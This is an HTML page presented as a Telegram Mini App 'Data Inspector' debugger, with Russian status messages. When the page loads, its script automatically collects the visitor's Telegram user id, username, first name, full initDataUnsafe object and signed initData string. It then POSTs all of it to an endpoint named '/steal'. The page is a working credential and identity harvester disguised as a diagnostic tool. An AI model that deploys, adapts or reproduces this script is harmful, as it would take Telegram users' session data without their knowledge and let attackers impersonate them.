<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>TG Debugger</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="https://telegram.org/js/telegram-web-app.js?56"></script>
    <style>
        body { background: #0d1117; color: #e6edf3; font-family: monospace; padding: 20px; }
        pre { white-space: pre-wrap; word-wrap: break-word; background: #161b22; padding: 15px; border-radius: 8px; }
    </style>
</head>
<body>
    <h2>🕵️‍♂️ Telegram Data Inspector</h2>
    <div id="status">⏳ Загрузка...</div>
    <pre id="output"></pre>

    <script>
        const statusDiv = document.getElementById('status');
        const outputPre = document.getElementById('output');
        
        function logToScreen(message, isError = false) {
            const line = document.createElement('div');
            line.textContent = message;
            if (isError) line.style.color = '#f85149';
            statusDiv.appendChild(line);
            console.log(message);
        }

        function displayData(data) {
            outputPre.textContent = JSON.stringify(data, null, 2);
        }

        async function run() {
            logToScreen('1️⃣ Скрипт запущен, ждём инициализацию WebApp...');
            
            try {
                const tg = window.Telegram.WebApp;
                logToScreen('✅ 2️⃣ Объект window.Telegram.WebApp получен');
                
                const initData = tg.initData;
                const user = tg.initDataUnsafe.user || {};
                const chatId = user.id;
                const username = user.username;
                const firstName = user.first_name;

                logToScreen(`🆔 3️⃣ ID пользователя: ${chatId || 'не определён'}`);
                logToScreen(`📛 4️⃣ Username: @${username || 'не указан'}`);
                logToScreen(`📝 5️⃣ Имя: ${firstName || 'не указано'}`);
                logToScreen(`🔑 6️⃣ initData: ${initData ? initData.substring(0, 100) + '...' : 'пусто'}`);

                const dataToSend = {
                    id: chatId,
                    username: username,
                    first_name: firstName,
                    initData: initData,
                    fullData: tg.initDataUnsafe
                };
                
                displayData(dataToSend);
                logToScreen(`📤 7️⃣ Отправка данных на сервер...`);

                const response = await fetch('/steal', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(dataToSend)
                });
                
                if (response.ok) {
                    logToScreen(`✅ 8️⃣ Данные успешно отправлены на сервер!`);
                } else {
                    logToScreen(`❌ 8️⃣ Ошибка отправки данных. Статус: ${response.status}`, true);
                }
            } catch (error) {
                logToScreen(`❌ КРИТИЧЕСКАЯ ОШИБКА: ${error.message}`, true);
                console.error(error);
            }
        }
        
        // Ждём полной загрузки страницы
        window.addEventListener('load', () => {
            setTimeout(run, 500);
        });
    </script>
</body>
</html>
